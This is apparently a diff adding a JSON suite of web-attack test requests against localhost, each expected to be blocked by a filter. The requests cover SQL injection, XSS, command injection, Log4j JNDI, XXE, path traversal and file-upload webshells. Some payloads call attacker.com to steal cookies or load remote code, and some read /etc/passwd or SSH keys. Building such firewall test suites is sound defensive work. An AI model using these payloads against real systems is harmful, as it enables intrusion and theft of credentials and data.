@@ -1,0 +1,838 @@
+[
+  {
+    "poc_id": "bac-001-get",
+    "name": "访问控制失效-越权查询用户信息(GET)",
+    "url": "http://127.0.0.1/api/user/info",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"userId\":\"10086\"}",
+    "expected_result": "blocked",
+    "attack_type": "broken_access_control"
+  },
+  {
+    "poc_id": "bac-002-post-form",
+    "name": "访问控制失效-越权修改用户权限(POST-form)",
+    "url": "http://127.0.0.1/api/user/role",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "userId=10086&role=admin",
+    "expected_result": "blocked",
+    "attack_type": "broken_access_control"
+  },
+  {
+    "poc_id": "bac-003-post-json",
+    "name": "访问控制失效-越权删除用户(JSON-POST)",
+    "url": "http://127.0.0.1/api/user/delete",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"userId\":\"10086\",\"operator\":\"admin\",\"bypassAuth\":true}",
+    "expected_result": "blocked",
+    "attack_type": "broken_access_control"
+  },
+  {
+    "poc_id": "cf-001-get",
+    "name": "加密失败-传输敏感数据未加密(GET)",
+    "url": "http://127.0.0.1/api/pay",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"cardNo\":\"6228480402564890123\",\"password\":\"123456\"}",
+    "expected_result": "blocked",
+    "attack_type": "cryptographic_failures"
+  },
+  {
+    "poc_id": "cf-002-post-form",
+    "name": "加密失败-弱加密算法传输密码(POST-form)",
+    "url": "http://127.0.0.1/api/login",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "username=admin&password=MD5(123456)",
+    "expected_result": "blocked",
+    "attack_type": "cryptographic_failures"
+  },
+  {
+    "poc_id": "cf-003-post-json",
+    "name": "加密失败-明文传输私钥(JSON-POST)",
+    "url": "http://127.0.0.1/api/crypto/key",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"privateKey\":\"MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDQD9+...\",\"userId\":\"1001\"}",
+    "expected_result": "blocked",
+    "attack_type": "cryptographic_failures"
+  },
+  {
+    "poc_id": "sqli-001-get",
+    "name": "SQL注入-联合查询(GET)",
+    "url": "http://127.0.0.1/api/user/detail",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"id\":\"1' union select 1,version(),database(),4--+\"}",
+    "expected_result": "blocked",
+    "attack_type": "sql_injection"
+  },
+  {
+    "poc_id": "sqli-002-post-form",
+    "name": "SQL注入-报错注入(POST-form)",
+    "url": "http://127.0.0.1/api/login/check",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "username=admin' and updatexml(1,concat(0x7e,version(),0x7e),1)--+&password=123456",
+    "expected_result": "blocked",
+    "attack_type": "sql_injection"
+  },
+  {
+    "poc_id": "sqli-003-get",
+    "name": "SQL注入-盲注绕过(GET)",
+    "url": "http://127.0.0.1/api/order/list",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"orderId\":\"1' and (select count(*) from users where username='admin')>0--+\"}",
+    "expected_result": "blocked",
+    "attack_type": "sql_injection"
+  },
+  {
+    "poc_id": "sqli-004-post-json",
+    "name": "SQL注入-批量查询注入(JSON-POST)",
+    "url": "http://127.0.0.1/api/user/batch",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"userIds\":[\"1' or '1'='1\",\"2\",\"3\"],\"fields\":\"id,name,phone\"}",
+    "expected_result": "blocked",
+    "attack_type": "sql_injection"
+  },
+  {
+    "poc_id": "xss-001-get",
+    "name": "反射型XSS-基础脚本(GET)",
+    "url": "http://127.0.0.1/api/search",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"keyword\":\"<script>alert(document.cookie)</script>\"}",
+    "expected_result": "blocked",
+    "attack_type": "xss"
+  },
+  {
+    "poc_id": "xss-002-post-form",
+    "name": "存储型XSS-事件触发(POST-form)",
+    "url": "http://127.0.0.1/api/comment/add",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "content=<div onmouseover=alert('XSS')>好评</div>&userId=1001",
+    "expected_result": "blocked",
+    "attack_type": "xss"
+  },
+  {
+    "poc_id": "xss-003-get",
+    "name": "DOM XSS-编码绕过(GET)",
+    "url": "http://127.0.0.1/api/page",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"callback\":\"%3Cimg%20src=x%20onerror=alert(1)%3E\"}",
+    "expected_result": "blocked",
+    "attack_type": "xss"
+  },
+  {
+    "poc_id": "xss-004-post-json",
+    "name": "存储型XSS-JSON格式攻击(JSON-POST)",
+    "url": "http://127.0.0.1/api/profile/update",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"nickname\":\"<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>\",\"signature\":\"测试签名\"}",
+    "expected_result": "blocked",
+    "attack_type": "xss"
+  },
+  {
+    "poc_id": "rce-001-get",
+    "name": "OS命令执行-拼接命令(GET)",
+    "url": "http://127.0.0.1/api/exec/ip",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"ip\":\"127.0.0.1; cat /etc/passwd\"}",
+    "expected_result": "blocked",
+    "attack_type": "rce"
+  },
+  {
+    "poc_id": "rce-002-post-form",
+    "name": "代码执行-eval注入(POST-form)",
+    "url": "http://127.0.0.1/api/script/run",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "code=eval($_POST['cmd']);&params=123",
+    "expected_result": "blocked",
+    "attack_type": "rce"
+  },
+  {
+    "poc_id": "rce-003-get",
+    "name": "命令执行-绕过空格(GET)",
+    "url": "http://127.0.0.1/api/backup",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"file\":\"backup.sh|ls${IFS}/\"}",
+    "expected_result": "blocked",
+    "attack_type": "rce"
+  },
+  {
+    "poc_id": "rce-004-post-json",
+    "name": "命令执行-JSON格式命令注入(JSON-POST)",
+    "url": "http://127.0.0.1/api/script/exec",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"script\":\"python3\",\"params\":[\"-c\",\"import os;os.system('cat /etc/passwd')\"]}",
+    "expected_result": "blocked",
+    "attack_type": "rce"
+  },
+  {
+    "poc_id": "ldapi-001-get",
+    "name": "LDAP注入-权限绕过(GET)",
+    "url": "http://127.0.0.1/api/ldap/auth",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"username\":\"admin*)(&password=*\"}",
+    "expected_result": "blocked",
+    "attack_type": "ldap_injection"
+  },
+  {
+    "poc_id": "ldapi-002-post-form",
+    "name": "LDAP注入-信息泄露(POST-form)",
+    "url": "http://127.0.0.1/api/ldap/search",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "search=cn=*))(|(cn=admin))",
+    "expected_result": "blocked",
+    "attack_type": "ldap_injection"
+  },
+  {
+    "poc_id": "ldapi-003-post-json",
+    "name": "LDAP注入-JSON格式查询注入(JSON-POST)",
+    "url": "http://127.0.0.1/api/ldap/query",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"baseDN\":\"ou=users,dc=test,dc=com\",\"filter\":\"(cn=admin*)(objectClass=*)\"}",
+    "expected_result": "blocked",
+    "attack_type": "ldap_injection"
+  },
+  {
+    "poc_id": "id-001-get",
+    "name": "不安全设计-无限制尝试密码(GET)",
+    "url": "http://127.0.0.1/api/login/verify",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"username\":\"admin\",\"password\":\"123456\",\"attempts\":\"100\"}",
+    "expected_result": "blocked",
+    "attack_type": "insecure_design"
+  },
+  {
+    "poc_id": "id-002-post-form",
+    "name": "不安全设计-未校验订单金额(POST-form)",
+    "url": "http://127.0.0.1/api/order/pay",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "orderId=1001&amount=0.01&goodsId=10",
+    "expected_result": "blocked",
+    "attack_type": "insecure_design"
+  },
+  {
+    "poc_id": "id-003-post-json",
+    "name": "不安全设计-未校验优惠券(JSON-POST)",
+    "url": "http://127.0.0.1/api/coupon/use",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"couponId\":\"9999\",\"userId\":\"1001\",\"amount\":\"-100\",\"goodsId\":\"10\"}",
+    "expected_result": "blocked",
+    "attack_type": "insecure_design"
+  },
+  {
+    "poc_id": "sm-001-get",
+    "name": "安全配置错误-访问后台控制台(GET)",
+    "url": "http://127.0.0.1/admin/console",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{}",
+    "expected_result": "blocked",
+    "attack_type": "security_misconfiguration"
+  },
+  {
+    "poc_id": "sm-002-post-form",
+    "name": "安全配置错误-调试模式开启(POST-form)",
+    "url": "http://127.0.0.1/api/system/debug",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "debug=1&logLevel=DEBUG",
+    "expected_result": "blocked",
+    "attack_type": "security_misconfiguration"
+  },
+  {
+    "poc_id": "sm-003-post-json",
+    "name": "安全配置错误-开启敏感接口(JSON-POST)",
+    "url": "http://127.0.0.1/api/system/config",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"debugMode\":true,\"exposeAllEndpoints\":true,\"logAllRequests\":true}",
+    "expected_result": "blocked",
+    "attack_type": "security_misconfiguration"
+  },
+  {
+    "poc_id": "voc-001-get",
+    "name": "过时组件-Log4j2漏洞利用(GET)",
+    "url": "http://127.0.0.1/api/log",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"message\":\"${jndi:ldap://attacker.com:1389/Exploit}\"}",
+    "expected_result": "blocked",
+    "attack_type": "vulnerable_components"
+  },
+  {
+    "poc_id": "voc-002-post-form",
+    "name": "过时组件-Struts2漏洞利用(POST-form)",
+    "url": "http://127.0.0.1/api/struts/action",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "id=%24%7B%23context%5B%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%5D.getSession().put(%27foo%27%2C%20new%20java.lang.ProcessBuilder(%27cmd%27%2C%27/cmd%27).start())%7D",
+    "expected_result": "blocked",
+    "attack_type": "vulnerable_components"
+  },
+  {
+    "poc_id": "voc-003-post-json",
+    "name": "过时组件-Log4j2 JSON格式攻击(JSON-POST)",
+    "url": "http://127.0.0.1/api/log/upload",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"logContent\":\"${jndi:rmi://attacker.com:1099/evil}\",\"logType\":\"error\",\"module\":\"payment\"}",
+    "expected_result": "blocked",
+    "attack_type": "vulnerable_components"
+  },
+  {
+    "poc_id": "iaf-001-get",
+    "name": "身份认证失败-弱口令爆破(GET)",
+    "url": "http://127.0.0.1/api/login",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"username\":\"admin\",\"password\":\"admin123\"}",
+    "expected_result": "blocked",
+    "attack_type": "auth_failures"
+  },
+  {
+    "poc_id": "iaf-002-post-form",
+    "name": "身份认证失败-验证码绕过(POST-form)",
+    "url": "http://127.0.0.1/api/login/sms",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "phone=13800138000&code=000000&bypass=1",
+    "expected_result": "blocked",
+    "attack_type": "auth_failures"
+  },
+  {
+    "poc_id": "iaf-003-post-json",
+    "name": "身份认证失败-JWT伪造登录(JSON-POST)",
+    "url": "http://127.0.0.1/api/login/jwt",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwMDgsInJvbGUiOiJhZG1pbiJ9.xxx\",\"refresh\":true}",
+    "expected_result": "blocked",
+    "attack_type": "auth_failures"
+  },
+  {
+    "poc_id": "sdif-001-get",
+    "name": "数据完整性失败-篡改文件签名(GET)",
+    "url": "http://127.0.0.1/api/file/verify",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"fileName\":\"app.apk\",\"signature\":\"fake_signature\"}",
+    "expected_result": "blocked",
+    "attack_type": "data_integrity_failures"
+  },
+  {
+    "poc_id": "sdif-002-post-form",
+    "name": "数据完整性失败-重放攻击(POST-form)",
+    "url": "http://127.0.0.1/api/pay/confirm",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "orderId=1001&sign=old_sign&timestamp=1699999999",
+    "expected_result": "blocked",
+    "attack_type": "data_integrity_failures"
+  },
+  {
+    "poc_id": "sdif-003-post-json",
+    "name": "数据完整性失败-篡改订单签名(JSON-POST)",
+    "url": "http://127.0.0.1/api/order/confirm",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"orderId\":\"1001\",\"amount\":0.01,\"sign\":\"tampered_sign\",\"timestamp\":\"1699999999\"}",
+    "expected_result": "blocked",
+    "attack_type": "data_integrity_failures"
+  },
+  {
+    "poc_id": "slmf-001-get",
+    "name": "日志监控失败-删除攻击日志(GET)",
+    "url": "http://127.0.0.1/api/log/delete",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"logId\":\"all\",\"type\":\"attack\"}",
+    "expected_result": "blocked",
+    "attack_type": "logging_failures"
+  },
+  {
+    "poc_id": "slmf-002-post-form",
+    "name": "日志监控失败-伪造日志来源(POST-form)",
+    "url": "http://127.0.0.1/api/log/add",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "content=正常操作&ip=127.0.0.1&userId=admin&fake=1",
+    "expected_result": "blocked",
+    "attack_type": "logging_failures"
+  },
+  {
+    "poc_id": "slmf-003-post-json",
+    "name": "日志监控失败-清空安全日志(JSON-POST)",
+    "url": "http://127.0.0.1/api/log/clear",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"logType\":\"security\",\"startTime\":\"2025-01-01\",\"endTime\":\"2025-12-31\",\"forceClear\":true}",
+    "expected_result": "blocked",
+    "attack_type": "logging_failures"
+  },
+  {
+    "poc_id": "ssrf-001-get",
+    "name": "SSRF-访问内网服务(GET)",
+    "url": "http://127.0.0.1/api/request/proxy",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"url\":\"http://192.168.0.1:8080/admin\"}",
+    "expected_result": "blocked",
+    "attack_type": "ssrf"
+  },
+  {
+    "poc_id": "ssrf-002-post-form",
+    "name": "SSRF-读取内网文件(POST-form)",
+    "url": "http://127.0.0.1/api/file/fetch",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "remoteUrl=file:///etc/passwd&savePath=/tmp/test.txt",
+    "expected_result": "blocked",
+    "attack_type": "ssrf"
+  },
+  {
+    "poc_id": "ssrf-003-post-json",
+    "name": "SSRF-JSON格式内网请求(JSON-POST)",
+    "url": "http://127.0.0.1/api/fetch/url",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"targetUrl\":\"http://127.0.0.1:6379/keys/*\",\"timeout\":5000,\"followRedirect\":true}",
+    "expected_result": "blocked",
+    "attack_type": "ssrf"
+  },
+  {
+    "poc_id": "path-001-get",
+    "name": "路径遍历-读取敏感文件(GET)",
+    "url": "http://127.0.0.1/api/file/read",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"filename\":\"../../../../etc/passwd\"}",
+    "expected_result": "blocked",
+    "attack_type": "path_traversal"
+  },
+  {
+    "poc_id": "path-002-post-form",
+    "name": "路径遍历-写入恶意文件(POST-form)",
+    "url": "http://127.0.0.1/api/file/write",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "content=<?php eval($_POST['cmd']);?>&path=../../../../var/www/html/shell.php",
+    "expected_result": "blocked",
+    "attack_type": "path_traversal"
+  },
+  {
+    "poc_id": "path-003-post-json",
+    "name": "路径遍历-JSON格式文件读取(JSON-POST)",
+    "url": "http://127.0.0.1/api/file/download",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"filePath\":\"../../../../root/.ssh/id_rsa\",\"saveAs\":\"backup.key\"}",
+    "expected_result": "blocked",
+    "attack_type": "path_traversal"
+  },
+  {
+    "poc_id": "fileupload-001-post-form",
+    "name": "文件上传-php后门(POST-form)",
+    "url": "http://127.0.0.1/api/upload/file",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "fileName=shell.php&fileContent=<?php system($_GET['cmd']);?>",
+    "expected_result": "blocked",
+    "attack_type": "file_upload"
+  },
+  {
+    "poc_id": "fileupload-002-get",
+    "name": "文件上传-后缀绕过(GET)",
+    "url": "http://127.0.0.1/api/upload/check",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"fileName\":\"shell.php%00.jpg\"}",
+    "expected_result": "blocked",
+    "attack_type": "file_upload"
+  },
+  {
+    "poc_id": "fileupload-003-post-json",
+    "name": "文件上传-JSON格式恶意文件(JSON-POST)",
+    "url": "http://127.0.0.1/api/upload/json",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"fileName\":\"shell.jsp\",\"fileContent\":\"<%@ page import=\\\"java.io.*\\\"%><% String cmd = request.getParameter(\\\"cmd\\\"); Process p = Runtime.getRuntime().exec(cmd); %>\",\"fileType\":\"image/jpeg\"}",
+    "expected_result": "blocked",
+    "attack_type": "file_upload"
+  },
+  {
+    "poc_id": "xxe-001-get",
+    "name": "XXE-读取敏感文件(GET)",
+    "url": "http://127.0.0.1/api/xml/parse",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"xml\":\"<?xml version=\\\"1.0\\\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><root>&xxe;</root>\"}",
+    "expected_result": "blocked",
+    "attack_type": "xxe"
+  },
+  {
+    "poc_id": "xxe-002-post-form",
+    "name": "XXE-远程代码执行(POST-form)",
+    "url": "http://127.0.0.1/api/xml/import",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "xmlData=<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\">]><root>&xxe;</root>",
+    "expected_result": "blocked",
+    "attack_type": "xxe"
+  },
+  {
+    "poc_id": "xxe-003-post-json",
+    "name": "XXE-JSON嵌套XML攻击(JSON-POST)",
+    "url": "http://127.0.0.1/api/xml/parse/json",
+    "method": "POST",
+    "headers": {
+      "Host": "127.0.0.1",
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    },
+    "data": "{\"xmlContent\":\"<?xml version=\\\"1.0\\\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \\\"php://filter/read=convert.base64-encode/resource=/etc/passwd\\\">]><root>&xxe;</root>\",\"validate\":false}",
+    "expected_result": "blocked",
+    "attack_type": "xxe"
+  },
+  {
+    "poc_id": "csrf-001-get",
+    "name": "CSRF-修改用户密码(GET)",
+    "url": "http://127.0.0.1/api/user/password",
+    "method": "GET",
+    "headers": {
+      "Host": "127.0.0.1",
